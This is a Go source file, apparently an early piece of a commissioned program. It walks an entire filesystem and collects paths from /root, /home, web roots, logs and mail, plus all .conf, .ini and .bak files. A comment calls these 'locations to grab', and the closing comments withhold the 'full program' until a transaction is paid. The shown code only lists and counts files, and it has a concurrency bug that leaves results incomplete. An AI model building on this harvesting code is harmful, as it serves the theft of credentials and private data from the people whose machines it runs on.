package main

import (
	"fmt"
	"path/filepath"
	"os"
)


type dataDump struct {
	dataLD []string
	dirFiles []string
	entireStruct []string
	output string
}

// -- Setters --
func (d *dataDump) SetDataLD(data []string) {
	d.dataLD = append(d.dataLD, data...)
}

func (d *dataDump) SetDirFiles(data []string) {
	d.dirFiles = append(d.dirFiles, data...)
}

func (d *dataDump) SetEntireStruct(entirity []string) {
	d.entireStruct = append(d.entireStruct, entirity...)
}

func (d *dataDump) SetOutput(output string) {
	d.output = output
}
// -- Setters --


func main() {
	// Create the model, and assign the locations to grab i.e /home, /etc/passwd, *.conf
	model := dataDump{}
	directories := []string{
		"/home/",
		"/root/",
		"/var/www/html",
		"/var/log/",
		"/var/mail/",
	}
	filetypes := []string{
		".conf",
		".ini",
		".bak",
	}


	fmt.Println("Starting")
	go fetchDirectories(directories, &model)
	fetchFiles(filetypes, &model)
	fmt.Println(len(model.dataLD))
	fmt.Println(len(model.dirFiles))
	fmt.Println(len(model.entireStruct))
}


// -- Operations --
func fetchFiles(filetypes []string, m *dataDump) {
	fmt.Println("Fetching important files")
	for index, file := range filetypes {
		files, err := WalkMatch("/", "*" + file, false)
		fmt.Printf("Index: %d, conf: %v, Files: %d, error: %v\n", index, file, len(files), err)
		m.SetDataLD(files)
	}
	fmt.Println("Fetching files done!")
}

func fetchDirectories(directories []string, m *dataDump) {
	fmt.Println("Fetching important directories")
	for index, _dir := range directories {
		files, err := WalkMatch(_dir, "*", false)
		fmt.Printf("Index: %d, dir: %v, Files: %d, error: %v\n", index, _dir, len(files), err)
		m.SetDirFiles(files)
	}

	fmt.Println("Fetching tree structure")

	tree, err := WalkMatch("/", "*", true)
	if err != nil {
		m.SetEntireStruct([]string{"Error while fetching"})
	} else {
		m.SetEntireStruct(tree)
	}

	fmt.Println("Fetching directory and tree files done!")
}

func WalkMatch(root, pattern string, dir bool) ([]string, error) {
	var matches []string
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		// if err != nil {
		// 	return err
		// }
		// if info.IsDir() {
		// 	return nil
		// }
		if !dir {
			if matched, err := filepath.Match(pattern, filepath.Base(path)); err != nil {
				return err
			} else if matched {
				matches = append(matches, path)
			}
		} else {
			if matched, err := filepath.Match(pattern, filepath.Base(path)); err != nil {
				return err
			} else if matched{
				fi, err := os.Stat(path)
				switch {
				case err != nil:
				case err == nil:
					if fi.IsDir() {
						matches = append(matches, path)
					}
				}
			}
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return matches, nil
}


// The full program will stay private and not pushed here, due to the potential of scammed that way
// I will keep you updated on the program by sending you videos
// After everything has been completed, and our transaction has been fullfilled. I will push everything here.
